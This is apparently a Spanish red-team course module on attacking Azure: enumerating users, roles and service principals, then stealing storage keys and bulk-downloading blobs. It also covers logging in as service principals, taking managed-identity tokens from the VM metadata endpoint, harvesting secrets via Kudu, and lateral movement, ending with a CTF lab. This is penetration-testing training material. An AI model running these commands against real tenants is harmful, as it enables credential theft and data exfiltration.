# MCRTA – Módulo 4

# Azure Red Team Essentials

**Versión Markdown profesional**

---

## 1. Introducción al Módulo

Microsoft Azure es el segundo proveedor más grande del mercado y el dominante en entornos empresariales con Active Directory.  
Para un operador Red Team, Azure aporta ventajas ofensivas únicas:

- Azure AD puede gestionar identidades externas y federadas.
    
- Las aplicaciones suelen tener permisos excesivos.
    
- Las Managed Identities son una mina de oro para escalación.
    
- Muchas empresas exponen endpoints de App Services, Storage y Function Apps sin validación.
    

En este módulo se estudiará:

- Enumeración ofensiva de Azure AD y RBAC.
    
- Identificación de roles mal asignados.
    
- Abuso de Service Principals y Managed Identities.
    
- Explotación de Storage, App Services, VM Metadata y Function Apps.
    
- Movimiento lateral dentro del tenant.
    
- Laboratorio de CTF ofensivo.
    

---

## 2. Identidad en Azure: la raíz de todo ataque

En Azure, casi todo se basa en identidades administradas por **Azure Active Directory (AAD)**.

Para descubrir quién eres realmente:

```
az ad signed-in-user show
```

Esto te muestra:

- ObjectId
    
- UserPrincipalName
    
- TenantId
    
- DisplayName
    

La ofensiva se construye sobre estas piezas.

---

## 3. Enumeración Ofensiva Inicial con Azure CLI

### 3.1 Listar usuarios del tenant

```
az ad user list --query "[].userPrincipalName"
```

### 3.2 Listar grupos

```
az ad group list --query "[].displayName"
```

### 3.3 Enumerar aplicaciones registradas

```
az ad app list
```

Esto es importante porque muchas aplicaciones tienen permisos peligrosos como:

```
Directory.ReadWrite.All 
Application.ReadWrite.All
```

### 3.4 Listar Service Principals

```
az ad sp list --all
```

Bandera roja: service principals que nadie recuerda que existen.

---

## 4. Enumeración de Roles y RBAC

Azure utiliza **Role-Based Access Control (RBAC)** a nivel de suscripción, grupo de recursos o recurso específico.

### 4.1 Listar roles asignados a la identidad actual

```
az role assignment list --assignee <OBJECT_ID>
```

### 4.2 Buscar roles peligrosos

Uno de los roles más críticos es **Owner**, que concede:

- Modificar RBAC
    
- Escalar privilegios
    
- Crear Service Principals
    
- Acceder a recursos administrados
    

Comando para buscarlo:

```
az role assignment list --query "[?roleDefinitionName=='Owner']"
```

### 4.3 Enumerar roles disponibles

```
az role definition list --query "[].roleName"
```

---

## 5. Azure Storage Offensive Enumeration

Los recursos de Storage (Blob, File, Queue, Table) son objetivos frecuentes.

### 5.1 Listar storage accounts

```
az storage account list -o table
```

### 5.2 Obtener claves de una storage account

```
az storage account keys list --account-name <STORAGE>
```

Si puedes obtener estas claves → acceso completo al almacenamiento.

### 5.3 Enumerar contenedores

```
az storage container list \
  --account-name <STORAGE> \
  --account-key <KEY>
```

### 5.4 Descargar contenedores completos

```
az storage blob download-batch \
  -d ./loot \
  -s <CONTAINER> \
  --account-name <STORAGE> \
  --account-key <KEY>
```

---

## 6. Abuso de Service Principals (SP)

Los Service Principals son identidades usadas por aplicaciones.  
Si obtienes su **Client Secret** o **Certificate**, puedes autenticarte como ellos.

### 6.1 Identificar SPs

```
az ad sp list --query "[].appDisplayName"
```

### 6.2 Ver permisos de un SP

```
az ad sp show --id <APP_ID>
```

### 6.3 Autenticación como SP

```
az login --service-principal \
  --username <APP_ID> \
  --password <CLIENT_SECRET> \
  --tenant <TENANT_ID>
```

Muchas veces, estos SP tienen permisos mucho mayores que el usuario humano.

---

## 7. Explotación de Managed Identities (la joya de Azure)

Las **Managed Identities** permiten que VMs y aplicaciones accedan a servicios sin claves.

Desde dentro de una VM:

### 7.1 Obtener el token de la identidad administrada

```
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Esto devuelve:

- access_token
    
- expires_on
    
- client_id
    

### 7.2 Usar el token para enumerar recursos

```
curl -H "Authorization: Bearer <TOKEN>" \
https://management.azure.com/subscriptions?api-version=2020-01-01
```

### 7.3 Bandera de riesgo

Si esta identidad tiene:

```
Owner
Contributor
User Access Administrator
```

→ escalación de privilegios inmediata.

---

## 8. Explotación de App Services y Function Apps

### 8.1 Enumerar App Services

```
az webapp list -o table
```

### 8.2 Leer variables de entorno

Si el panel de Kudu está expuesto:

```
https://<APP>.scm.azurewebsites.net
```

Allí suelen encontrarse:

- Connection strings
    
- Credenciales internas
    
- Azure Storage Keys
    
- Secrets de API
    

### 8.3 Descargar código fuente

```
az webapp download-artifact \
  --resource-group <RG> \
  --name <APP>
```

Este código frecuentemente contiene secretos.

---

## 9. Movimiento Lateral en Azure

### 9.1 Desde una Managed Identity → a un Resource Group

Si tienes permisos de _Contributor_:

```
az vm list --resource-group <RG> -o table
```

Luego puedes:

- Leer historial de ejecuciones
    
- Crear nuevas funciones
    
- Crear nuevas identidades asociadas
    
- Modificar Storage
    

### 9.2 Desde Service Principal → a toda la suscripción

Cuando un SP tiene:

```
roleDefinitionName: Owner
```

Es equivalente a Administrador Global a nivel de recursos.

Permite:

```
az role assignment create ...
az vm create ...
az functionapp create ...
```

---

## 10. Laboratorio Práctico (CTF Azure)

### Flags del módulo

- **Flag 1:** Una identidad con rol Owner asignado erróneamente.
    
- **Flag 2:** Un Storage Account accesible por claves expuestas.
    
- **Flag 3:** Un token de Managed Identity con permisos excesivos.
    

### Comandos clave

Buscar Owners:

```
az role assignment list --query "[?roleDefinitionName=='Owner']"
```

Buscar Storage vulnerable:

```
az storage account list
az storage account keys list --account-name <STORAGE>
```

Obtener token de MI:

```
curl -H Metadata:true \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 11. Resumen Final del Módulo

En este módulo aprendiste a:

- Enumerar usuarios, roles, grupos y permisos en Azure.
    
- Identificar asignaciones críticas como Owner o Contributor.
    
- Abusar Service Principals y autenticarse como aplicaciones.
    
- Explotar Managed Identities para obtener permisos superiores.
    
- Descargar datos de Storage y App Services.
    
- Realizar movimiento lateral dentro de una suscripción.
    
- Capturar las primeras flags ofensivas en Azure.